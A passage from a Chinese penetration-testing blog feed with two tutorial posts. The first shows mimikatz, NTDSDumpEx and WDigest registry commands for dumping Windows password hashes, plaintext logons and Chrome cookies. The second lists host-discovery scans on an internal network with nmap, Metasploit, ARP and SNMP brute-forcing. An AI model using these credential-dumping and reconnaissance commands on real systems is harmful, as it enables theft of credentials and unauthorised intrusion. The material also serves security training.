<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>ntdsutil snapshot “unmount <span class="token punctuation">&#123;</span><span class="token constant">GUID</span><span class="token punctuation">&#125;</span>” quit quit</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>ntdsutil snapshot <span class="token string">" delete &#123;GUID&#125; "</span> quit quit</pre></td></tr></table></figure><h2 id="使用ntdsdumpexexe提取hash"><a class="anchor" href="#使用ntdsdumpexexe提取hash">#</a> 使用 Ntdsdumpex.exe 提取 hash</h2>
<p><span class="exturl" data-url="aHR0cDovL3d3dy56Y2dvbnZoLmNvbS96Yl91c2Vycy91cGxvYWQvMjAxNy8wMi8yMDE3MDIyMzE5MTYzOTE0ODc4NDg1OTk0MDIzMS56aXA=">NTDSDumpEx 下载链接</span></p>
<p>解压密码： <code>zcgonvh</code></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Ntdsdumpex<span class="token punctuation">.</span>exe <span class="token operator">-</span>r <span class="token operator">-</span>d ntds<span class="token punctuation">.</span>dit –o hash<span class="token punctuation">.</span>txt</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206150716041.png" alt="image-20211206150716041" /></p>
<p>如有设置密码则会生成相应的 <code>hash</code>  文件</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206150755715.png" alt="image-20211206150755715" /></p>
<p>使用 <code>mimakatz</code>  获取 <code>hash</code>  与明文口令</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>privilege<span class="token operator">::</span><span class="token function">debug</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>sekurlsa<span class="token operator">::</span><span class="token function">logonPasswords</span></pre></td></tr></table></figure><p>从  <code>Windows 8.1</code>  和  <code>Windows Server 2012 R2</code>  开始， <code>LM</code>  哈希和 “纯文本” 密码将不在内存中生成，早期版本的 <code>Windows 7/8/2008 R2/2012</code>  需要打  <code>kb2871997</code>  补丁。</p>
<p>抓取到了 <code>NTLM</code>  后，<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMjFyMDAwL3Avd3d3LmNtZDUuY29t">破解 MD5</span></p>
<p>尝试<span class="exturl" data-url="aHR0cHM6Ly93d3cub2JqZWN0aWYtc2VjdXJpdGUuY2gvb3BoY3JhY2sucGhw">破解 2-ophcrack</span></p>
<p>修改注册表，启用摘要密码支持</p>
<p>需要创建 <code>UseLogonCredential</code> ，并赋值为 <code>1</code></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">HKEY_LOCAL_MACHINE</span>\<span class="token constant">SYSTEM</span>\CurrentControlSet\Control\SecurityProviders \WDigest <span class="token function">“UseLogonCredential”</span><span class="token punctuation">(</span><span class="token constant">DWORD</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>重新登录后，再次运行就会直接抓取明文密码。</p>
<h2 id="mimikatz提取chrome中保存的cookie"><a class="anchor" href="#mimikatz提取chrome中保存的cookie">#</a> mimikatz 提取 chrome 中保存的 cookie</h2>
<p>首先把 <code>chrome</code>  保存 <code>cookie</code>  的文件拷贝到桌面上方便操作，这个文件在</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">C</span><span class="token operator">:</span>\users\xxx\appdata\local\google\chrome\user data\<span class="token keyword">default</span>\cookies</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206151704318.png" alt="image-20211206151704318" /></p>
<p>命令行下拷贝的命令是：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Copy '<span class="token constant">C</span><span class="token operator">:</span>\users\xxx\appdata\local\google\chrome\user data\<span class="token keyword">default</span>\cookies ’ c<span class="token operator">:</span>\users\xxx\desktop</pre></td></tr></table></figure><p><code>mimikatz_trunk</code>  文件包中有个 <code>x64</code>  文件夹，进入并打开 <code>mimikatz.exe</code> ，输入</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206152317965.png" alt="image-20211206152317965" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">dpapi</span><span class="token operator">:</span><span class="token operator">:</span>chrome <span class="token operator">/</span><span class="token keyword">in</span><span class="token operator">:</span>c<span class="token operator">:</span>\users\xxx\desktop\cookies <span class="token operator">/</span>unprotect</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206152131712.png" alt="image-20211206152131712" /></p>
<p>提取 <code>cookie</code> ， <code>mimikatz</code>  的 <code>token</code>  模块中的命令列出 <code>token</code> ，模仿 <code>system</code>  用户 <code>token</code> <br />
 选择以<strong>管理员身份</strong>运行 <code>mimikatz.exe</code> ，</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>privilege<span class="token operator">::</span><span class="token function">debug</span> #获取debug权限</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>token<span class="token operator">::</span><span class="token function">elevate</span> #模仿system用户的令牌</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>token<span class="token operator">::</span><span class="token function">list</span> #列出令牌</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>lsadump<span class="token operator">::</span><span class="token function">sam</span> #来获取sam数据库中的密码</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>token<span class="token operator">::</span><span class="token function">revert</span> #恢复令牌</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206152509111.png" alt="image-20211206152509111" /></p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>好吧，没有感言！</p>
<p>参考链接：<br />
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjk5ODQyMC9hcnRpY2xlL2RldGFpbHMvODMyNjk5NTg=">内网渗透测试的艺术 [二] 凭证收集</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>windows信息搜集篇（四）之内网存活主机探测的多种方式</title>
    <url>/article/85cc03e0.html</url>
    <content><![CDATA[<p>话不多说，直接开始吧，头已经大了！</p>
<h1 id="00x01-netbios协议探测"><a class="anchor" href="#00x01-netbios协议探测">#</a> 00x01 Netbios 协议探测</h1>
<h2 id="11-netbios简介"><a class="anchor" href="#11-netbios简介">#</a> 1.1 netbios 简介</h2>
<p><code>IBM</code>  公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口（ <code>API</code> ），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。系统可以利用 <code>WINS</code>  服务、广播及 <code>Lmhost</code>  文件等多种模式将 <code>NetBIOS</code>  名 -—— 特指基于 <code>NETBIOS</code>  协议获得计算机名称 —— 解析为相应 IP 地址，实现信息通讯，所以在局域网内部使用 <code>NetBIOS</code>  协议可以方便地实现消息通信及资源的共享</p>
<h2 id="12-nmap扫描"><a class="anchor" href="#12-nmap扫描">#</a> 1.2 nmap 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>sU <span class="token operator">--</span>script nbstat<span class="token punctuation">.</span>nse <span class="token operator">-</span>p137 <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span><span class="token constant">T4</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206160211983.png" alt="image-20211206160211983" /></p>
<h2 id="13-msf扫描"><a class="anchor" href="#13-msf扫描">#</a> 1.3 msf 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    └─# msfconsole</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206160348269.png" alt="image-20211206160348269" /></p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token operator">></span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname</pre></td></tr><tr><td data-num="2"></td><td><pre>    msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname<span class="token punctuation">)</span> <span class="token operator">></span> show options</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206160506137.png" alt="image-20211206160506137" /></p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname<span class="token punctuation">)</span> <span class="token operator">></span> set RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr><tr><td data-num="2"></td><td><pre>RHOSTS <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr><tr><td data-num="3"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname<span class="token punctuation">)</span> <span class="token operator">></span> run</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206160927298.png" alt="image-20211206160927298" /></p>
<h2 id="14-nbtscan扫描"><a class="anchor" href="#14-nbtscan扫描">#</a> 1.4 nbtscan 扫描</h2>
<p><span class="exturl" data-url="aHR0cDovL3d3dy51bml4d2l6Lm5ldC90b29scy9uYnRzY2FuLmh0bWw=">项目地址</span></p>
<p><strong>Windows:</strong></p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>nbtscan<span class="token punctuation">.</span>exe <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206161354834.png" alt="image-20211206161354834" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nbtstat <span class="token operator">-</span>n</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206161513360.png" alt="image-20211206161513360" /></p>
<p><strong>Linux：</strong></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nbtscan <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206161649372.png" alt="image-20211206161649372" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nbtscan <span class="token operator">-</span>v <span class="token operator">-</span>s<span class="token operator">:</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206161816036.png" alt="image-20211206161816036" /></p>
<h1 id="00x02-icmp协议探测"><a class="anchor" href="#00x02-icmp协议探测">#</a> 00x02 ICMP 协议探测</h1>
<h2 id="21-icmp简介"><a class="anchor" href="#21-icmp简介">#</a> 2.1 ICMP 简介</h2>
<p>它是 <code>TCP/IP</code>  协议族的一个子协议，用于在 <code>IP</code>  主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。</p>
<h2 id="22-cmd下扫描"><a class="anchor" href="#22-cmd下扫描">#</a> 2.2 CMD 下扫描</h2>
<p>扫描内网 <code>C</code>  段存活主机</p>
<p><code>IP</code>  段改为自己想要扫描的 <code>IP</code>  段即可，视自己情况而定</p>
<p>命令行直显：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token operator">/</span>l <span class="token operator">%</span>i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">do</span> @ ping <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span><span class="token operator">%</span>i <span class="token operator">-</span>w <span class="token number">1</span> <span class="token operator">-</span>n <span class="token number">1</span><span class="token operator">|</span>find <span class="token operator">/</span>i <span class="token string">"ttl="</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206162603807.png" alt="image-20211206162603807" /></p>
<p>输出内容导出：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>@<span class="token keyword">for</span> <span class="token operator">/</span>l <span class="token operator">%</span>i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">do</span> @ping <span class="token operator">-</span>n <span class="token number">1</span> <span class="token operator">-</span>w <span class="token number">40</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span><span class="token operator">%</span>i <span class="token operator">&amp;</span> <span class="token keyword">if</span> errorlevel <span class="token number">1</span> <span class="token punctuation">(</span>echo <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span><span class="token operator">%</span>i<span class="token operator">>></span>c<span class="token operator">:</span>\a<span class="token punctuation">.</span>txt<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token punctuation">(</span>echo <span class="token number">192.168</span><span class="token number">.1</span><span class="token punctuation">.</span><span class="token operator">%</span>i <span class="token operator">>></span>c<span class="token operator">:</span>\b<span class="token punctuation">.</span>txt<span class="token punctuation">)</span></pre></td></tr></table></figure><p>因为要写 <code>C</code>  盘，所以需要管理员权限的 <code>cmd</code>  运行。(导出其他盘符，不需要管理员权限)</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206162831125.png" alt="image-20211206162831125" /></p>
<h2 id="23-nmap扫描"><a class="anchor" href="#23-nmap扫描">#</a> 2.3 nmap 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>sn <span class="token operator">-</span><span class="token constant">PE</span> <span class="token operator">-</span><span class="token constant">T4</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span>    #（扫描一个<span class="token constant">C</span>段下的存活主机<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206163058720.png" alt="image-20211206163058720" /></p>
<h2 id="24-powershell扫描"><a class="anchor" href="#24-powershell扫描">#</a> 2.4 powershell 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>powershell<span class="token punctuation">.</span>exe ‐exec bypass ‐Command <span class="token string">"Import‐Module ./Invoke‐TSPingSweep.ps1; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ResolveHost ‐ScanPort ‐Port 445,135"</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/1561366-20191129181950543-864548871.png" alt="img" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">D</span><span class="token operator">:</span>\<span class="token operator">></span>tcping<span class="token punctuation">.</span>exe ‐n <span class="token number">1</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token number">80</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/1561366-20191129182105502-752087539.png" alt="img" /></p>
<h1 id="00x03-udp协议探测"><a class="anchor" href="#00x03-udp协议探测">#</a> 00x03 UDP 协议探测</h1>
<h2 id="31-udp简介"><a class="anchor" href="#31-udp简介">#</a> 3.1 UDP 简介</h2>
<p><code>UDP</code> （ <code>User Datagram Protocol</code> ）是一种无连接的协议，在第四层 - 传输层，处于 <code>IP</code>  协议的上一层。 <code>UDP</code>  有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。</p>
<h2 id="32-udp显著特性"><a class="anchor" href="#32-udp显著特性">#</a> 3.2 UDP 显著特性</h2>
<p>1. <code>UDP</code>  缺乏可靠性。 <code>UDP</code>  本身不提供确认，超时重传等机制。 <code>UDP</code>  数据报可能在网络中被复制，被重新排序，也不保证每个数据报只到达一次。<br />
2. <code>UDP</code>  数据报是有长度的。每个  <code>UDP</code>  数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而  <code>TCP</code>  是一个字节流协议，没有任何（协议上的）记录边界。<br />
3. <code>UDP</code>  是无连接的。 <code>UDP</code>  客户和服务器之前不必存在长期的关系。大多数的 <code>UDP</code>  实现中都选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的 <code>UDP</code>  数据报<br />
 4. <code>UDP</code>  支持多播和广播。</p>
<h2 id="33-nmap扫描"><a class="anchor" href="#33-nmap扫描">#</a> 3.3 nmap 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# nmap <span class="token operator">-</span>sU <span class="token operator">-</span><span class="token constant">T5</span> <span class="token operator">-</span>sV <span class="token operator">--</span>max<span class="token operator">-</span>retries <span class="token number">1</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span> <span class="token operator">-</span>p <span class="token number">500</span></pre></td></tr></table></figure><p>慢的令人发指，稍微等一下或者另开一个窗口进行下一条命令好了。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206163504037.png" alt="image-20211206163504037" /></p>
<h2 id="34-msf扫描"><a class="anchor" href="#34-msf扫描">#</a> 3.4 msf 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe</pre></td></tr><tr><td data-num="2"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206163442339.png" alt="image-20211206163442339" /></p>
<h2 id="35-unicornscantcp协议扫描工具"><a class="anchor" href="#35-unicornscantcp协议扫描工具">#</a> 3.5 unicornscanTCP 协议扫描工具</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzIxcjAwMC91bmljb3Juc2Nhbg==">项目地址</span></p>
<p><code>linux</code>  下使用推荐</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# unicornscan <span class="token operator">-</span>mU <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span></pre></td></tr></table></figure><h2 id="36-scanline扫描"><a class="anchor" href="#36-scanline扫描">#</a> 3.6 ScanLine 扫描</h2>
<p>推荐 <code>win</code>  下使用，以管理员身份执行。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206170607737.png" alt="image-20211206170607737" /></p>
<h2 id="37-在线"><a class="anchor" href="#37-在线">#</a> 3.7 在线</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9wZW50ZXN0LXRvb2xzLmNvbS9uZXR3b3JrLXZ1bG5lcmFiaWxpdHktc2Nhbm5pbmcvbmV0d29yay1zZWN1cml0eS1zY2FubmVyLW9ubGluZS1vcGVudmFz">在线基于 Nmap 的 udp 扫描</span></p>
<h1 id="00x04-arp协议探测"><a class="anchor" href="#00x04-arp协议探测">#</a> 00x04 ARP 协议探测</h1>
<h2 id="41-arp简介"><a class="anchor" href="#41-arp简介">#</a> 4.1 ARP 简介</h2>
<p><code>ARP</code> , 通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据 <code>IP</code>  地址获取物理地址的一个 <code>TCP/IP</code>  协议。主机发送信息时将包含目标 <code>IP</code>  地址的 <code>ARP</code>  请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址</p>
<h2 id="42-nmap扫描"><a class="anchor" href="#42-nmap扫描">#</a> 4.2 nmap 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# nmap <span class="token operator">-</span>sn <span class="token operator">-</span><span class="token constant">PR</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206170835529.png" alt="image-20211206170835529" /></p>
<h2 id="43-msf扫描"><a class="anchor" href="#43-msf扫描">#</a> 4.3 msf 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msf6 <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep<span class="token punctuation">)</span> <span class="token operator">></span> use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep</pre></td></tr></table></figure><h2 id="44-netdiscover"><a class="anchor" href="#44-netdiscover">#</a> 4.4 netdiscover</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# ifconfig #查看本机存在的网卡</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>└─# netdiscover <span class="token operator">-</span>r <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span>i <span class="token function">eth0</span><span class="token punctuation">(</span>网卡名称<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206171230132.png" alt="image-20211206171230132" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206171112614.png" alt="image-20211206171112614" /></p>
<h2 id="45-arp-scanlinux"><a class="anchor" href="#45-arp-scanlinux">#</a> 4.5 arp-scan（linux）</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi8xL2FycC1zY2Fu">项目地址</span></p>
<p>新版的 <code>kali</code>  中都自带 <code>arp-scan</code> ，如无内置则需要下载安装：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# apt<span class="token operator">-</span><span class="token keyword">get</span> install arp<span class="token operator">-</span>scan</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206171417370.png" alt="image-20211206171417370" /></p>
<h2 id="46-arp-scanwindows"><a class="anchor" href="#46-arp-scanwindows">#</a> 4.6 arp-scan（windows）</h2>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>arp<span class="token operator">-</span>scan<span class="token punctuation">.</span>exe <span class="token operator">-</span>t <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token operator">/</span><span class="token number">24</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Fic3VyYW5BbGFuZy9hcnAtc2Nhbi13aW5kb3dzLQ==">（非官方）项目地址</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/1561366-20191129180232418-1064578044.png" alt="img" /></p>
<h2 id="47-powershell"><a class="anchor" href="#47-powershell">#</a> 4.7 Powershell</h2>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>c<span class="token operator">:</span>\tmp<span class="token operator">></span>powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span><span class="token class-name">Command</span> <span class="token string">"Import-Module .\arpscan.ps1;InvokeARPScan -CIDR 192.168.1.0/24"</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/1561366-20191129175859161-294565698.png" alt="img" /></p>
<h1 id="00x05-snmp协议探测"><a class="anchor" href="#00x05-snmp协议探测">#</a> 00x05 SNMP 协议探测</h1>
<h2 id="51-snmp简介"><a class="anchor" href="#51-snmp简介">#</a> 5.1 SNMP 简介</h2>
<p><code>SNMP</code>  是一种简单网络管理协议，它属于 <code>TCP/IP</code>  五层协议中的应用层协议，用于网络管理的协议。 <code>SNMP</code>  主要用于网络设备的管理。 <code>SNMP</code>  协议主要由两大部分构成： <code>SNMP</code>  管理站和 <code>SNMP</code>  代理。 <code>SNMP</code>  管理站是一个中心节点，负责收集维护各个 <code>SNMP</code>  元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而 <code>SNMP</code>  代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与 <code>SNMP</code>  管理站交互，接收并执行管理站的命令，上传各种本地的网络信息。</p>
<h2 id="52-nmap扫描"><a class="anchor" href="#52-nmap扫描">#</a> 5.2 nmap 扫描</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# nmap <span class="token operator">-</span>sU <span class="token operator">--</span>script snmp<span class="token operator">-</span>brute <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span><span class="token constant">T4</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211206180125241.png" alt="image-20211206180125241" /></p>
<h2 id="53-msf扫描"><a class="anchor" href="#53-msf扫描">#</a> 5.3 msf 扫描</h2>
